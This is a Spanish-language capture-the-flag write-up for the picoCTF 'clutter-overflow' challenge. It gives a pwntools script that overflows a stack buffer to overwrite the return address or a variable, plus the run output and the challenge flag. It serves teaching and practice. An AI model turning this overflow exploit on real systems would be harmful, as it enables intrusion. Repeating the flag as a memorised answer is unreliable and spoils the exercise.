# clutter-overflow

## Objetivo.

Clutter, clutter everywhere and not a byte to use.
`nc mars.picoctf.net 31890`

## Solución.

**El siguiente script da la bandera**

```
from pwn import *

#Sets remote host and port
p = remote("mars.picoctf.net", 31890)

#Only one of the payloads below will work at a time

#This overwrites the instruction pointer, jumps to `0x0040077e`, and thus executes `cat flag.txt`
########## Use This or The Other One ###############

payload = b"A"*280 
payload += p64(0x0040077e)

####################################################


#This overwrites the variable to make it equal to "0xdeadbeef", which prints us the flag
######### Use This or The Other One ################

#payload = b"A"*264 
#payload += p64(0xdeadbeef)

####################################################
p.sendline(payload)

p.interactive()
```

**Ejecutamos el exploit**

┌──(kali㉿kali)-[~/picoctf/tercerparcial/clutteroverflow]

└─$ python3 exp.py
```
[+] Opening connection to mars.picoctf.net on port 31890: Done
[*] Switching to interactive mode
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0x4141414141414141
code != 0xdeadbeef :(
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
```

**Bandera** picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

## Notas opcionales.

## Referencias.
